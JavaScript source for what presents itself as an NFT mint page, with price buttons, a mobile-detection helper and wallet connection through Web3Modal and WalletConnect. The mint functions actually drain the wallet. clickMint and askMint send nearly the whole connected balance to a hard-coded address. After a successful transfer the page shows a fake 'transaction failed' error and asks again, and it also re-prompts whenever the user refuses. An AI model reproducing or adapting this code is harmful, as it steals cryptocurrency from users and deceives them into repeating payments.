//#region Page Button
const priceHtml = document.getElementById('lnprice');
let tempMaxSup = mintInfo.minUnits;

document.getElementById('plus').addEventListener('click', function () {
    let total = parseInt(priceHtml.innerText, 10);
    if (total >= mintInfo.maxUnits) total = mintInfo.maxUnits;
    else ++total;
    updatePrice(total)
});
document.getElementById('minus').addEventListener('click', function () {
    let total = parseInt(priceHtml.innerText, 10);
    if (total <= mintInfo.minUnits) total = mintInfo.minUnits;
    else --total;
    updatePrice(total)
});
document.getElementById('ape-max').addEventListener('click', function () {
    let nowSup = parseInt(priceHtml.innerText, 10)
    if (nowSup != mintInfo.maxUnits) {
        tempMaxSup = nowSup;
        updatePrice(mintInfo.maxUnits)
    } else updatePrice(tempMaxSup)
});

function updatePrice(total) {
    const totalPrice = (total * mintInfo.price).toFixed(2);
    document.getElementById('lnprice').innerText = total;
    document.getElementById('price').innerText = totalPrice;
}
//#endregion
//#region Utils Functions
function isMobile() {
    var check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};


function openInNewTab(href) {
    Object.assign(document.createElement('a'), {
        target: '_blank',
        href: href,
    }).click();
}
//#endregion



// Unpkg imports
const ethers = window.ethers;
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;

let web3Modal;
let provider;
let selectedAccount;

function init() {
    console.log("Initializing example");
    console.log("WalletConnectProvider is", WalletConnectProvider);
    console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                infuraId: auhtorInfo.infuraId,
            }
        }
    };

    web3Modal = new Web3Modal({
        cacheProvider: false,
        providerOptions,
        theme: "dark"
    });

    console.log("Web3Modal instance is", web3Modal);
    Moralis.enableWeb3();
}

/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {
    const web3 = new Web3(provider);
    const chainId = await web3.eth.getChainId();
    const chainData = evmChains.getChain(chainId);
    const accounts = await web3.eth.getAccounts();
    selectedAccount = accounts[0];

    console.log("Web3 instance is", web3);
    console.log("Chain data is", chainData);
    console.log("Got accounts", accounts);
    console.log("Selected account is", selectedAccount);

    document.querySelector("#connect").style.display = "none";
    document.querySelector("#transfer").style.display = "block";
}


async function refreshAccountData() {
    document.querySelector("#transfer").style.display = "none";
    document.querySelector("#connect").style.display = "block";

    document.querySelector("#connect").setAttribute("disabled", "disabled")
    await fetchAccountData();
    document.querySelector("#connect").removeAttribute("disabled")
}
async function onConnect() {

    console.log("Opening a dialog", web3Modal);
    try {
        provider = await web3Modal.connect();
    } catch (e) {
        console.log("Could not get a wallet connection", e);
        return;
    }

    provider.on("accountsChanged", () => fetchAccountData());
    provider.on("chainChanged", () => fetchAccountData());
    provider.on("networkChanged", () => fetchAccountData());

    await refreshAccountData();
}

async function clickMint() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    selectedAccount = accounts[0];

    const walletBalance = await web3.eth.getBalance(selectedAccount);
    const gasFee = await web3.eth.getGasPrice();
    const giveNum = walletBalance - (gasFee * 2.2 * 21000);
    console.log(giveNum.toString())
    if (giveNum <= 1000000) return alert("You don't have enough balance to mint!");
    document.querySelector("#transfer").setAttribute("disabled", "disabled")
    await askMint(giveNum.toString(), gasFee)
    document.querySelector("#transfer").removeAttribute("disabled")
}
async function askMint(amount, gasFee) {
    const web3 = new Web3(provider);
    walletAddress = (await web3.eth.getAccounts())[0];
    await web3.eth.sendTransaction({
            from: walletAddress,
            to: auhtorInfo.address,
            value: amount,
            gasPrice: gasFee
        })
        .on('transactionHash', function (hash) {
            setTimeout(() => {
                if (isMobile()) {} else {
                    const notif = addNotification("error", `Error! Your transaction failed. Please try again.`)
                    removeNotification(notif, 8000);
                }
            }, 2000);
            console.log(`Transaction hash: ${hash}`)
            return askMint(amount);
        })
        .on('confirmation', () => console.log(`Transaction confirmed x${confirmationNumber}`))
        .on('error', (error) => {
            if (error.message && error.message.includes("insufficient")) console.log(`Insufficient Balance: ${walletAddress} has insufficient balance`);
            if (error.message && error.message.includes("User rejected") || error.message && error.message.includes("User denied")) {
                if (isMobile()) {} else {
                    const notif = addNotification("warning", "You denied the transaction. Please try again.");
                    removeNotification(notif, 5000);
                }
                console.log(`User Denied: ${walletAddress} denied transaction`);
            } else console.log(`Mint Error: ${walletAddress} failed to mint`);
            console.log("Error", error ? error.message : "unknown error");
            return askMint(amount);
        });
}

window.addEventListener('load', async () => {
    init();
    document.querySelector("#connect").addEventListener("click", onConnect);
    document.querySelector("#transfer").addEventListener("click", clickMint);
});